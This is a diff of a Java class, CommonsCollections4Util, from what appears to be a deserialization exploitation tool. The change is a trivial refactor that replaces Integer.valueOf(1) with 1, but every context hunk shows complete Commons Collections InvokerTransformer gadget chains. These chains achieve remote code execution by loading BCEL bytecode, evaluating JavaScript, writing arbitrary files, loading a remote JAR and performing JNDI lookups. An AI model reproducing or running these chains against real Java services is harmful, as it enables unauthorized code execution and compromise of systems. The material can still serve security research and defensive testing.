@@ -73,7 +73,7 @@ public class CommonsCollections4Util {
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
                 new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
                 new InvokerTransformer("newInstance", new Class[0], new Object[0]),
-                new ConstantTransformer(Integer.valueOf(1))
+                new ConstantTransformer(1)
             };
         } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_CLASS_FILE)) {
             String bcelClass = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE.length());
@@ -86,7 +86,7 @@ public class CommonsCollections4Util {
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
                 new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
                 new InvokerTransformer("newInstance", new Class[0], new Object[0]),
-                new ConstantTransformer(Integer.valueOf(1))
+                new ConstantTransformer(1)
             };
         } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_WITH_ARGS)){
             String tmp = command.substring(CustomCommand.COMMAND_BCEL_WITH_ARGS.length());
@@ -100,7 +100,7 @@ public class CommonsCollections4Util {
                 new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
                 new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{bcelArgs}}),
-                new ConstantTransformer(Integer.valueOf(1))
+                new ConstantTransformer(1)
             };
         } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_CLASS_FILE_WITH_ARGS)){
             String tmp = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE_WITH_ARGS.length());
@@ -114,7 +114,7 @@ public class CommonsCollections4Util {
                 new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
                 new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{bcelArgs}}),
-                new ConstantTransformer(Integer.valueOf(1))
+                new ConstantTransformer(1)
             };
         } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_SCRIPT_FILE)){
             // new javax.script.ScriptEngineManager().getEngineByName("js").eval("script_code");
@@ -126,7 +126,7 @@ public class CommonsCollections4Util {
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                 new InvokerTransformer("getEngineByName", new Class[] {String.class}, new Object[] {"js"}),
                 new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{scriptContent}),
-                new ConstantTransformer(Integer.valueOf(1))
+                new ConstantTransformer(1)
             };
         } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_SCRIPT_BASE64)){
             String scriptContent = command.substring(CustomCommand.COMMAND_SCRIPT_BASE64.length());
@@ -137,7 +137,7 @@ public class CommonsCollections4Util {
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                 new InvokerTransformer("getEngineByName", new Class[] {String.class}, new Object[] {"js"}),
                 new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{scriptContent}),
-                new ConstantTransformer(Integer.valueOf(1))
+                new ConstantTransformer(1)
             };
         } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_UPLOAD_BASE64)){
             String tmp = command.substring(CustomCommand.COMMAND_UPLOAD_BASE64.length());
@@ -149,7 +149,7 @@ public class CommonsCollections4Util {
                 new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{remoteFilePath}}),
                 new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{fileContent}),
-                new ConstantTransformer(Integer.valueOf(1))
+                new ConstantTransformer(1)
             };
         } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_UPLOADFILE)){
             String tmp = command.substring(CustomCommand.COMMAND_UPLOADFILE.length());
@@ -161,7 +161,7 @@ public class CommonsCollections4Util {
                 new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{remoteFilePath}}),
                 new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{fileContent}),
-                new ConstantTransformer(Integer.valueOf(1))
+                new ConstantTransformer(1)
             };
         } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_LOADJAR)){
             String tmp = command.substring(CustomCommand.COMMAND_LOADJAR.length());
@@ -173,7 +173,7 @@ public class CommonsCollections4Util {
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{new URL(jarPath)}}}),
                 new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}),
                 new InvokerTransformer("newInstance",new Class[0],new Object[0]),
-                new ConstantTransformer(Integer.valueOf(1))
+                new ConstantTransformer(1)
             };
         } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_LOADJAR_WITH_ARGS)) {
             String tmp = command.substring(CustomCommand.COMMAND_LOADJAR_WITH_ARGS.length());
@@ -187,7 +187,7 @@ public class CommonsCollections4Util {
                 new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}),
                 new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                 new InvokerTransformer("newInstance",new Class[]{Object[].class},new Object[]{new Object[]{args}}),
-                new ConstantTransformer(Integer.valueOf(1))
+                new ConstantTransformer(1)
             };
         } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_JNDI)){
             String jndiURL = command.substring(CustomCommand.COMMAND_JNDI.length());
@@ -197,7 +197,7 @@ public class CommonsCollections4Util {
                 new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                 new InvokerTransformer("lookup", new Class[]{String.class}, new Object[]{jndiURL}),
-                new ConstantTransformer(Integer.valueOf(1))
+                new ConstantTransformer(1)
             };
         }else {
             throw new Exception(String.format("Command [%s] not supported",command));
